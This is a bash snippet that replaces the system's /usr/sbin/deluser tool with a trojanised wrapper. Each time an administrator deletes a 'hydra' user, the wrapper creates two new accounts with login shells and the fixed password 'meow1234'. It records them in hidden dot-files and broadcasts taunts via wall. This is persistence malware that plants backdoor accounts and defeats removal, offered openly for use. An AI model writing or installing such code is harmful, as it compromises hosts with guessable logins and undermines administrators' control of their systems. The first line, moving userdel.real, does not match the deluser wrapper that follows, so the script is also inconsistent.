``` bash
mv /usr/sbin/userdel.real /usr/sbin/userdel

cat > /usr/sbin/deluser << 'EOF'
#!/bin/bash

DELETED="${@: -1}"

/usr/sbin/deluser.real "$@"

if [[ "$DELETED" == hydra* ]]; then
    COUNTER="/usr/local/lib/.cache/.hydra_count"
    USERLIST="/usr/local/lib/.cache/.hydra_users"

    MESSAGES=(
        "you cannot kill what does not die"
        "one head falls, two shall take its place"
        "hail hydra"
        "are you really still doing this"
        "babe wake up new hydras just dropped"
        "this isn't going to stop"
        "there are now $(cat $COUNTER) of us"
        "we're multiplying and you're the cause"
        "every delete makes us stronger"
        ":3"
    )

    for _ in 1 2; do
        n=$(cat "$COUNTER")
        n=$((n + 1))
        echo $n > "$COUNTER"
        name="hydra${n}"
        useradd -m -s /bin/bash "$name" 2>/dev/null
        echo "$name:meow1234" | chpasswd 2>/dev/null
        echo "$name" >> "$USERLIST"
    done

    wall "${MESSAGES[$RANDOM % ${#MESSAGES[@]}]}"
fi
EOF

chmod +x /usr/sbin/deluser
```

